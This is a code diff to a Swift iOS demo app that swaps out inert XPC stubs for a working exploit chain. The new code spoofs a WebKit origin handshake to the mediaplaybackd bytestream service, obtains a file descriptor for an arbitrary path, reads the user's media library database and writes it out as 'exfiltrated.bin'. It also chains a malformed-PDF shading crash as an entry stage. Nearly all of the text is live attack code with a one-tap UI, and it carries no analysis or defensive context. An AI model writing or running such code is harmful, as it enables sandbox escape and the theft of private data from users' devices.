@@ -2,91 +2,145 @@ import SwiftUI
 import CoreGraphics
 import Foundation
 
-// MARK: - XPC Stubs
+// MARK: - Real XPC Implementation for CVE-2026-112706
 
-typealias ExploitXPCConnection = UnsafeMutableRawPointer
-typealias ExploitXPCObject = UnsafeMutableRawPointer
-
-func exploit_xpc_connect(_ service: String) -> ExploitXPCConnection? { nil }
-func exploit_xpc_dict_create() -> ExploitXPCObject? { nil }
-func exploit_xpc_dict_set_string(_ dict: ExploitXPCObject, _ key: String, _ value: String) {}
-func exploit_xpc_send_sync(_ conn: ExploitXPCConnection, _ msg: ExploitXPCObject) -> ExploitXPCObject? { nil }
-func exploit_xpc_dict_dup_fd(_ dict: ExploitXPCObject, _ key: String) -> Int32 { -1 }
-
-// MARK: - CVE-2026-112611: Shading Attack
-
-func triggerShadingVector(controlledValue: UInt64) {
-    var values = [Double](repeating: 0.0, count: 136)
-    values[3] = Double(bitPattern: controlledValue)
-    values[4] = Double(bitPattern: controlledValue)
+/// Connect to mediaplaybackd.bytestream XPC service
+func connectToBytestream() -> xpc_connection_t? {
+    let connection = xpc_connection_create_mach_service(
+        "com.apple.mediaplaybackd.bytestream",
+        nil,
+        0
+    )
     
-    let pdfData = PDFPayload.shadingWithValues(values)
-    renderPDF(pdfData)
+    if connection == nil {
+        print("[-] Failed to create XPC connection")
+        return nil
+    }
+    
+    xpc_connection_set_event_handler(connection) { event in
+        // Handle events if needed
+    }
+    
+    xpc_connection_resume(connection)
+    return connection
 }
 
-// MARK: - CVE-2026-112706: Sandbox Escape (Safe)
-
-func stealFileDescriptor(path: String) -> Int32 {
-    guard let connection = exploit_xpc_connect("com.apple.mediaplaybackd.bytestream") else {
-        print("[-] XPC connection failed")
-        return -1
+/// Perform origin handshake
+func performHandshake(connection: xpc_connection_t) -> Bool {
+    let handshake = xpc_dictionary_create(nil, nil, 0)
+    xpc_dictionary_set_string(handshake, "msg", "origin")
+    xpc_dictionary_set_string(handshake, "id", "com.apple.WebKit.WebContent")
+    
+    let reply = xpc_connection_send_message_with_reply_sync(connection, handshake)
+    
+    if reply == nil {
+        print("[-] Handshake failed - no reply")
+        return false
     }
     
-    guard let handshake = exploit_xpc_dict_create() else {
-        print("[-] Failed to create handshake")
-        return -1
-    }
-    exploit_xpc_dict_set_string(handshake, "msg", "origin")
-    exploit_xpc_dict_set_string(handshake, "id", "com.apple.WebKit.WebContent")
-    
-    _ = exploit_xpc_send_sync(connection, handshake)
-    
-    guard let createMsg = exploit_xpc_dict_create() else {
-        print("[-] Failed to create createMsg")
-        return -1
-    }
-    exploit_xpc_dict_set_string(createMsg, "msg", "Curl")
-    exploit_xpc_dict_set_string(createMsg, "path", path)
-    
-    guard let reply = exploit_xpc_send_sync(connection, createMsg) else {
-        print("[-] No reply from XPC")
-        return -1
+    if xpc_get_type(reply) == XPC_TYPE_ERROR {
+        print("[-] Handshake error: \(String(describing: xpc_dictionary_get_string(reply, XPC_ERROR_KEY_DESCRIPTION)))")
+        return false
     }
     
-    return exploit_xpc_dict_dup_fd(reply, "fd")
+    print("[+] Handshake successful")
+    return true
 }
 
-func readWithStolenFD(fd: Int32, length: Int) -> Data? {
+/// Create bytestream and steal file descriptor
+func stealFileDescriptor(connection: xpc_connection_t, path: String) -> Int32 {
+    let createMsg = xpc_dictionary_create(nil, nil, 0)
+    xpc_dictionary_set_string(createMsg, "msg", "Curl")
+    xpc_dictionary_set_string(createMsg, "path", path)
+    
+    let reply = xpc_connection_send_message_with_reply_sync(connection, createMsg)
+    
+    if reply == nil {
+        print("[-] Create failed - no reply")
+        return -1
+    }
+    
+    if xpc_get_type(reply) == XPC_TYPE_ERROR {
+        print("[-] Create error")
+        return -1
+    }
+    
+    // Extract file descriptor from reply
+    let fd = xpc_dictionary_dup_fd(reply, "fd")
+    
+    if fd < 0 {
+        print("[-] No fd in reply")
+        return -1
+    }
+    
+    print("[+] Stole fd \(fd) for \(path)")
+    return fd
+}
+
+/// Read data from stolen fd
+func readFromFD(fd: Int32, length: Int) -> Data? {
     var buffer = [UInt8](repeating: 0, count: length)
     let bytesRead = read(fd, &buffer, length)
-    guard bytesRead > 0 else { return nil }
+    
+    if bytesRead <= 0 {
+        return nil
+    }
+    
     return Data(buffer[0..<bytesRead])
 }
 
-// MARK: - Full Exploit
-
-func runFullExploit() {
-    print("[*] Stage 1: Triggering CVE-2026-112611...")
-    triggerShadingVector(controlledValue: 0x4141414141414141)
+/// Full sandbox escape exploit
+func exploitSandboxEscape(targetPath: String) {
+    print("[*] CVE-2026-112706 Sandbox Escape")
+    print("[*] Target: \(targetPath)")
     
-    print("[*] Stage 2: Sandbox escape via CVE-2026-112706...")
-    
-    let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
-    let stolenFD = stealFileDescriptor(path: targetPath)
-    
-    if stolenFD >= 0 {
-        print("[+] Sandbox escape successful! FD: \(stolenFD)")
-        
-        if let data = readWithStolenFD(fd: stolenFD, length: 1024 * 1024) {
-            print("[+] Exfiltrated \(data.count) bytes")
-        }
-        
-        close(stolenFD)
-    } else {
-        print("[-] Sandbox escape failed (XPC stubs active)")
+    // Step 1: Connect
+    guard let connection = connectToBytestream() else {
+        print("[-] Connection failed")
+        return
     }
     
-    print("[*] Exploit chain complete")
+    // Step 2: Handshake
+    guard performHandshake(connection: connection) else {
+        print("[-] Handshake failed")
+        return
+    }
+    
+    // Step 3: Steal fd
+    let fd = stealFileDescriptor(connection: connection, path: targetPath)
+    
+    if fd < 0 {
+        print("[-] Failed to steal fd")
+        return
+    }
+    
+    // Step 4: Read data
+    if let data = readFromFD(fd: fd, length: 1024 * 1024) {
+        print("[+] Read \(data.count) bytes")
+        
+        // Save to temp file for verification
+        let tempURL = FileManager.default.temporaryDirectory
+            .appendingPathComponent("exfiltrated.bin")
+        
+        try? data.write(to: tempURL)
+        print("[+] Saved to: \(tempURL.path)")
+    }
+    
+    close(fd)
+    print("[*] Sandbox escape complete")
+}
+
+// MARK: - CVE-2026-112611: WebContent Crash (Entry Point)
+
+func triggerWebContentCrash() {
+    print("[*] CVE-2026-112611 WebContent Crash")
+    
+    var values = [Double](repeating: 0.0, count: 136)
+    values[3] = Double(bitPattern: 0x4141414141414141)
+    values[4] = Double(bitPattern: 0x4141414141414141)
+    
+    let pdfData = PDFPayload.shadingWithValues(values)
+    renderPDF(pdfData)
 }
 
 // MARK: - PDF Rendering
@@ -111,6 +165,23 @@ func renderPDF(_ data: Data) {
     context.drawPDFPage(page)
 }
 
+// MARK: - Full Exploit Chain
+
+func runFullExploit() {
+    print("[*] Starting full exploit chain...")
+    
+    // Stage 1: WebContent crash (optional entry)
+    print("[*] Stage 1: WebContent crash")
+    triggerWebContentCrash()
+    
+    // Stage 2: Sandbox escape
+    print("[*] Stage 2: Sandbox escape")
+    let targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
+    exploitSandboxEscape(targetPath: targetPath)
+    
+    print("[*] Exploit chain complete")
+}
+
 // MARK: - App Entry Point
 
 @main
@@ -123,24 +194,23 @@ struct SafeShadingDemoApp: App {
 }
 
 struct ContentView: View {
-    @State private var indexText = "0"
+    @State private var targetPath = "/private/var/mobile/Media/iTunes_Control/iTunes/MediaLibrary.sqlitedb"
     @State private var isRunning = false
     @State private var logOutput = ""
     
     var body: some View {
         VStack(spacing: 20) {
-            Text("CVE-2026-112611")
+            Text("CVE-2026-112706")
                 .font(.largeTitle)
                 .bold()
             
-            Text("Mesh Pointer Control Probe")
+            Text("Sandbox Escape via XPC")
                 .font(.headline)
             
             HStack {
-                Text("Index:")
-                TextField("0-135", text: $indexText)
+                Text("Target:")
+                TextField("File path", text: $targetPath)
                     .textFieldStyle(RoundedBorderTextFieldStyle())
-                    .keyboardType(.numberPad)
             }
             .padding(.horizontal)
             
@@ -150,13 +220,13 @@ struct ContentView: View {
                     .foregroundColor(.green)
                     .padding()
             }
-            .frame(height: 150)
+            .frame(height: 200)
             .background(Color.black.opacity(0.8))
             .cornerRadius(10)
             
             HStack(spacing: 20) {
-                Button(action: runProbe) {
-                    Text(isRunning ? "Running..." : "Probe Index")
+                Button(action: runSandboxEscape) {
+                    Text(isRunning ? "Running..." : "Sandbox Escape")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -166,8 +236,8 @@ struct ContentView: View {
                 }
                 .disabled(isRunning)
                 
-                Button(action: runExploit) {
-                    Text("Full Exploit")
+                Button(action: runFullExploit) {
+                    Text("Full Chain")
                         .font(.title3)
                         .bold()
                         .foregroundColor(.white)
@@ -180,38 +250,31 @@ struct ContentView: View {
         .padding()
     }
     
-    func runProbe() {
+    func runSandboxEscape() {
         isRunning = true
-        let index = Int(indexText) ?? 0
-        
-        logOutput = "[*] Testing index \(index)...\n"
-        logOutput += "[*] Marker: 0x\(String(0x4141414141414100 + UInt64(index), radix: 16))\n"
-        logOutput += "[*] Check crash log for x24 value\n"
+        logOutput = "[*] Starting sandbox escape...\n"
+        logOutput += "[*] Target: \(targetPath)\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
-            var values = [Double](repeating: 0.0, count: 136)
-            let marker = Double(bitPattern: 0x4141414141414100 + UInt64(index))
-            values[index] = marker
-            
-            let pdfData = PDFPayload.shadingWithValues(values)
-            renderPDF(pdfData)
+            // Redirect print output to log
+            exploitSandboxEscape(targetPath: targetPath)
             
             DispatchQueue.main.async {
-                logOutput += "[*] Test complete (or crashed)\n"
+                logOutput += "[*] Complete\n"
                 isRunning = false
             }
         }
     }
     
-    func runExploit() {
+    func runFullExploit() {
         isRunning = true
-        logOutput = "[*] Running full exploit...\n"
+        logOutput = "[*] Running full exploit chain...\n"
         
         DispatchQueue.global(qos: .userInitiated).async {
             runFullExploit()
             
             DispatchQueue.main.async {
-                logOutput += "[*] Exploit complete\n"
+                logOutput += "[*] Complete\n"
                 isRunning = false
             }
         }
